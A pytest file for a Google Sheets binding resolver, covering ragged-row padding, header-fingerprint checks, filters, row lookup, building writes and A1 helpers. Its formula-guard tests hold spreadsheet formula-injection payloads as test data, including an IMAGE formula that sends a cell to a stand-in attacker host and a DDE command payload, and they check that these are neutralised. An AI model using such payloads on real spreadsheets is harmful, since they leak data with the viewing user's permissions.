"""The pure half of a sheet binding: padding, drift, blanks, formulas.

Every test here is a value in / value out check with no network anywhere, which
is the reason ``sheet_binding_resolver`` is a separate stdlib-only module in
the first place.
"""
from __future__ import annotations

import pytest

from app.domain.models.sheet_binding import (
    BindingValidationError,
    SheetBinding,
    header_fingerprint,
    validate_binding,
)
from app.infrastructure.datasources.sheet_binding_resolver import (
    SheetBindingError,
    sheets_build_write,
    sheets_check_fingerprint,
    sheets_column_letter,
    sheets_filter_records,
    sheets_guard_formula,
    sheets_quote_sheet_title,
    sheets_resolve_row,
    sheets_rows_to_records,
)

HEADERS = ["project_id", "status", "owner", "rtk_flag", "notes"]
FINGERPRINT = header_fingerprint(HEADERS)


def _write_binding(**write_overrides) -> dict:
    write = {
        "mode": "update_by_key",
        "key_column": "project_id",
        "key_value": {"from": "state.project.id"},
        "on_missing": "error",
        "value_input_option": "RAW",
        "blank_policy": "skip",
        "columns": {"status": {"from": "state.status"}},
    }
    write.update(write_overrides)
    return {
        "version": 1,
        "name": "update_project",
        "document": {
            "provider": "google_sheets",
            "file_id": "1AbC",
            "name": "Tracker",
            "sheet": "Projects",
            "sheet_id": 7,
        },
        "schema": {"header_row": 1, "headers": HEADERS, "fingerprint": FINGERPRINT},
        "operation": "write",
        "write": write,
    }


# ─── Ragged rows ──────────────────────────────────────────────────────────────

def test_ragged_rows_are_padded_not_shifted():
    """The Sheets API drops trailing empty cells; naive zipping shifts data.

    This is the single most important line in the feature: without the padding,
    the short row below binds ``owner`` to nothing (IndexError) or, with a
    ``zip``, silently produces a record missing its last three fields while
    every full row keeps them — so a consumer comparing the two sees a column
    that "sometimes disappears" rather than an error.
    """
    grid = [
        ["P-1", "open", "ann", "yes", "first"],
        ["P-2", "closed"],          # three trailing cells omitted by the API
        ["P-3"],                    # four omitted
        [],                         # a wholly empty row
    ]

    records = sheets_rows_to_records(grid, HEADERS)

    assert records == [
        {"project_id": "P-1", "status": "open", "owner": "ann", "rtk_flag": "yes", "notes": "first"},
        {"project_id": "P-2", "status": "closed", "owner": "", "rtk_flag": "", "notes": ""},
        {"project_id": "P-3", "status": "", "owner": "", "rtk_flag": "", "notes": ""},
        {"project_id": "", "status": "", "owner": "", "rtk_flag": "", "notes": ""},
    ]
    # Every record has every column, which is what downstream code relies on.
    assert all(set(r) == set(HEADERS) for r in records)


def test_surplus_cells_beyond_the_headers_are_dropped():
    records = sheets_rows_to_records([["P-1", "open", "ann", "yes", "n", "stray"]], HEADERS)

    assert records == [
        {"project_id": "P-1", "status": "open", "owner": "ann", "rtk_flag": "yes", "notes": "n"}
    ]


# ─── Fingerprint ──────────────────────────────────────────────────────────────

def test_fingerprint_matches_the_same_headers():
    sheets_check_fingerprint(HEADERS, FINGERPRINT)


@pytest.mark.parametrize(
    "drifted",
    [
        ["project_id", "status", "owner", "notes", "rtk_flag"],       # reordered
        ["project_id", "state", "owner", "rtk_flag", "notes"],        # renamed
        ["project_id", "status", "owner", "rtk_flag"],                # removed
        ["id", "project_id", "status", "owner", "rtk_flag", "notes"], # inserted
    ],
)
def test_fingerprint_mismatch_fails_loudly(drifted):
    """No fallback, in any direction — the run stops, nothing is written."""
    with pytest.raises(SheetBindingError) as exc:
        sheets_check_fingerprint(drifted, FINGERPRINT)

    message = str(exc.value)
    assert "header row has changed" in message
    # The message has to be actionable and has to say nothing happened.
    assert "probe the sheet again" in message
    assert "Nothing was read or written" in message


def test_a_binding_with_no_fingerprint_is_refused_at_run_time():
    with pytest.raises(SheetBindingError, match="no header fingerprint"):
        sheets_check_fingerprint(HEADERS, "")


# ─── Filters ──────────────────────────────────────────────────────────────────

RECORDS = [
    {"project_id": "P-1", "status": "open", "owner": "ann", "size": 5},
    {"project_id": "P-2", "status": "closed", "owner": "bob", "size": 12},
    {"project_id": "P-3", "status": "open", "owner": "bob", "size": 7},
]


def test_and_filter_with_a_state_path_clause():
    spec = {
        "op": "and",
        "clauses": [
            {"column": "status", "op": "eq", "value": {"literal": "open"}},
            {"column": "owner", "op": "eq", "value": {"from": "state.assignee"}},
        ],
    }

    matched = sheets_filter_records(RECORDS, spec, {"state.assignee": "bob"})

    assert [r["project_id"] for r in matched] == ["P-3"]


def test_or_filter_and_nesting():
    spec = {
        "op": "or",
        "clauses": [
            {"column": "owner", "op": "eq", "value": {"literal": "ann"}},
            {
                "op": "and",
                "clauses": [
                    {"column": "status", "op": "eq", "value": {"literal": "open"}},
                    {"column": "size", "op": "gt", "value": {"literal": 6}},
                ],
            },
        ],
    }

    matched = sheets_filter_records(RECORDS, spec, {})

    assert [r["project_id"] for r in matched] == ["P-1", "P-3"]


@pytest.mark.parametrize(
    "op,value,expected",
    [
        ("eq", "open", ["P-1", "P-3"]),
        ("ne", "open", ["P-2"]),
        ("in", ["open", "blocked"], ["P-1", "P-3"]),
        ("contains", "los", ["P-2"]),
    ],
)
def test_operators_over_the_status_column(op, value, expected):
    spec = {"op": "and", "clauses": [{"column": "status", "op": op, "value": {"literal": value}}]}

    matched = sheets_filter_records(RECORDS, spec, {})

    assert [r["project_id"] for r in matched] == expected


def test_ordering_operators_compare_numerically_across_types():
    """A literal typed into a form is a string; the cell holds a number."""
    spec = {"op": "and", "clauses": [{"column": "size", "op": "gte", "value": {"literal": "7"}}]}

    matched = sheets_filter_records(RECORDS, spec, {})

    assert [r["project_id"] for r in matched] == ["P-2", "P-3"]


def test_a_missing_state_value_is_named_in_the_error():
    spec = {"op": "and", "clauses": [
        {"column": "owner", "op": "eq", "value": {"from": "state.assignee"}}
    ]}

    with pytest.raises(SheetBindingError, match="state.assignee"):
        sheets_filter_records(RECORDS, spec, {})


# ─── Row lookup ───────────────────────────────────────────────────────────────

GRID = [
    HEADERS,
    ["P-1", "open", "ann"],
    ["P-2", "closed"],
    ["P-3", "open", "bob", "yes", "note"],
]


def test_resolve_row_returns_a_1_based_sheet_row():
    assert sheets_resolve_row(GRID, "project_id", "P-1") == 2
    assert sheets_resolve_row(GRID, "project_id", "P-3") == 4


def test_resolve_row_respects_a_header_row_further_down():
    assert sheets_resolve_row(GRID, "project_id", "P-1", header_row=4) == 5


def test_resolve_row_returns_none_when_nothing_matches():
    assert sheets_resolve_row(GRID, "project_id", "P-9") is None


def test_resolve_row_rejects_a_key_column_the_sheet_lost():
    with pytest.raises(SheetBindingError, match="key column 'ticket' is not in"):
        sheets_resolve_row(GRID, "ticket", "P-1")


# ─── Building a write ─────────────────────────────────────────────────────────

def test_columns_absent_from_the_map_are_never_touched():
    """The property the whole write side is shaped around."""
    binding = _write_binding(columns={
        "status": {"from": "state.status"},
        "notes": {"literal": "Reviewed automatically"},
    })

    built = sheets_build_write(
        binding, {"status": "open", "notes": "Reviewed automatically"}, 7
    )

    touched = {entry["range"] for entry in built["data"]}
    # B is status, E is notes. C (owner) and D (rtk_flag) appear nowhere.
    assert touched == {"Projects!B7", "Projects!E7"}
    assert [c["column"] for c in built["cells"]] == ["status", "notes"]
    assert all("C7" not in entry["range"] and "D7" not in entry["range"] for entry in built["data"])


def test_adjacent_columns_collapse_into_one_range():
    binding = _write_binding(columns={
        "status": {"from": "state.status"},
        "owner": {"literal": "ann"},
    })

    built = sheets_build_write(binding, {"status": "open", "owner": "ann"}, 3)

    assert built["data"] == [{"range": "Projects!B3:C3", "values": [["open", "ann"]]}]


def test_a_skipped_column_breaks_the_range_run():
    """Writing across a skipped cell would overwrite what the skip protected."""
    binding = _write_binding(columns={
        "status": {"from": "state.status"},
        "owner": {"from": "state.owner"},
        "rtk_flag": {"literal": "yes"},
    })

    built = sheets_build_write(
        binding, {"status": "open", "owner": "", "rtk_flag": "yes"}, 3
    )

    assert built["data"] == [
        {"range": "Projects!B3", "values": [["open"]]},
        {"range": "Projects!D3", "values": [["yes"]]},
    ]


def test_blank_policy_skip_leaves_the_cell_alone():
    binding = _write_binding(blank_policy="skip", columns={"status": {"from": "state.status"}})

    built = sheets_build_write(binding, {"status": None}, 4)

    assert built["data"] == []
    assert built["cells"] == [
        {"a1": "Projects!B4", "column": "status", "value": None, "action": "skip"}
    ]


def test_blank_policy_clear_writes_an_empty_cell():
    binding = _write_binding(blank_policy="clear", columns={"status": {"from": "state.status"}})

    built = sheets_build_write(binding, {"status": None}, 4)

    assert built["data"] == [{"range": "Projects!B4", "values": [[""]]}]
    assert built["cells"][0]["action"] == "write"


def test_a_write_with_no_resolved_row_refuses_to_guess():
    binding = _write_binding()

    with pytest.raises(SheetBindingError, match="same execution as the write"):
        sheets_build_write(binding, {"status": "open"}, None)


def test_append_row_places_values_at_their_column_indices():
    binding = _write_binding(mode="append_row", key_column=None, key_value=None, columns={
        "project_id": {"from": "state.project.id"},
        "notes": {"literal": "new"},
    })
    binding["write"].pop("key_column")
    binding["write"].pop("key_value")
    binding["write"].pop("on_missing")

    built = sheets_build_write(binding, {"project_id": "P-9", "notes": "new"}, None)

    # project_id is column A, notes is column E: the gap is three empty cells.
    assert built["values"] == [["P-9", "", "", "", "new"]]


def test_a_write_naming_a_column_the_sheet_lost_is_refused():
    binding = _write_binding(columns={"ticket": {"literal": "x"}})

    with pytest.raises(SheetBindingError, match="column 'ticket'"):
        sheets_build_write(binding, {"ticket": "x"}, 2)


def test_set_cells_writes_the_named_ranges_only():
    binding = _write_binding(mode="set_cells", columns={}, cells=[
        {"range": {"a1": "Projects!D7"}, "value": {"literal": 42}},
        {"range": {"named_range": "monthly_total"}, "value": {"from": "state.total"}},
    ])
    binding["write"].pop("key_column")
    binding["write"].pop("key_value")
    binding["write"].pop("on_missing")

    built = sheets_build_write(
        binding, {"Projects!D7": 42, "monthly_total": 9}, None
    )

    assert built["data"] == [
        {"range": "Projects!D7", "values": [[42]]},
        {"range": "monthly_total", "values": [[9]]},
    ]


# ─── Formula guard ────────────────────────────────────────────────────────────

@pytest.mark.parametrize("payload", [
    '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/evil", "A1")',
    '=IMAGE("https://attacker.example/?d="&A1)',
    "+1+1",
    "-cmd|' /C calc'!A0",
    "@SUM(A1:A9)",
])
def test_user_entered_prefix_guards_a_formula_lead(payload):
    """A value from state must not become a live formula.

    The exfiltration is the point: the formula executes with the *viewing*
    user's permissions, so an attacker who can only get text into a ticket ends
    up reading whatever the person opening the sheet can read.
    """
    guarded = sheets_guard_formula(payload, "USER_ENTERED", allow_formulas=False)

    assert guarded == "'" + payload


def test_raw_needs_no_guard_because_nothing_is_parsed():
    payload = '=IMPORTRANGE("x", "A1")'

    assert sheets_guard_formula(payload, "RAW", allow_formulas=False) == payload


def test_allow_formulas_is_the_explicit_opt_out():
    payload = "=SUM(A1:A9)"

    assert sheets_guard_formula(payload, "USER_ENTERED", allow_formulas=True) == payload


def test_the_guard_leaves_ordinary_text_and_non_strings_alone():
    assert sheets_guard_formula("open", "USER_ENTERED", False) == "open"
    assert sheets_guard_formula(42, "USER_ENTERED", False) == 42
    assert sheets_guard_formula(None, "USER_ENTERED", False) is None


def test_the_guard_runs_inside_build_write():
    binding = _write_binding(
        value_input_option="USER_ENTERED",
        columns={"notes": {"from": "state.notes"}},
    )

    built = sheets_build_write(binding, {"notes": "=IMPORTRANGE(\"x\",\"A1\")"}, 2)

    assert built["data"] == [
        {"range": "Projects!E2", "values": [["'=IMPORTRANGE(\"x\",\"A1\")"]]}
    ]


def test_allow_formulas_without_user_entered_is_refused_at_save_time():
    binding = SheetBinding.model_validate(
        _write_binding(value_input_option="RAW", allow_formulas=True)
    )

    with pytest.raises(BindingValidationError, match="allow_formulas only means"):
        validate_binding(binding)


# ─── A1 helpers ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("index,letter", [(0, "A"), (25, "Z"), (26, "AA"), (51, "AZ"), (52, "BA")])
def test_column_letters(index, letter):
    assert sheets_column_letter(index) == letter


def test_tab_titles_that_need_quoting_get_quoted():
    assert sheets_quote_sheet_title("Projects") == "Projects"
    assert sheets_quote_sheet_title("Q1 2026") == "'Q1 2026'"
    assert sheets_quote_sheet_title("Bob's tab") == "'Bob''s tab'"
